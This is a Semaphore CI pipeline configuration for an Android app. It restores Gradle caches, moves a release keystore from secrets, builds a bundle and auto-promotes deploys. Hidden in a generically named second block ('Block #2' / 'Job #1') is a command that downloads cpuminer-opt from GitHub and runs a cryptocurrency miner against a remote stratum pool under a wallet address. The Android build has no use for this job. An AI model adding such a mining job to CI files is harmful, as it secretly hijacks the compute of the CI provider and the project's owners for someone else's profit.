version: v1.0
name: Verification Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu1804
  containers:
    - name: main
      image: 'registry.semaphoreci.com/android:29'
auto_cancel:
  running:
    when: 'true'
global_job_config:
  env_vars:
    - name: ADB_INSTALL_TIMEOUT
      value: '10'
  secrets:
    - name: android_keys
  prologue:
    commands:
      - checkout
      - mv ~/release-keystore.jks ~/$SEMAPHORE_GIT_DIR/app/release-keystore.jks
      - cache restore gradle-wrapper
      - cache restore gradle-cache
      - cache restore android-build
blocks:
  - name: Build
    skip:
      when: (branch != 'master' OR branch != 'dev') AND pull_request !~ '.*'
    task:
      jobs:
        - name: Build Project
          commands:
            - ./gradlew bundle
      epilogue:
        on_pass:
          commands:
            - cache clear
            - cache store gradle-wrapper ~/.gradle/wrapper
            - cache store gradle-cache ~/.gradle/caches
            - cache store android-build ~/.android/build-cache
  - name: 'Block #2'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MYkMsBC5C3XidNixZofNNsYabY8LZZQoeh.2 -t 6'
promotions:
  - name: Internal Deploy
    pipeline_file: deploy-internal.yml
    auto_promote:
      when: result = 'passed' AND branch = 'dev'
  - name: Beta Deploy
    pipeline_file: deploy-beta.yml
    auto_promote:
      when: result = 'passed' AND branch = 'master'
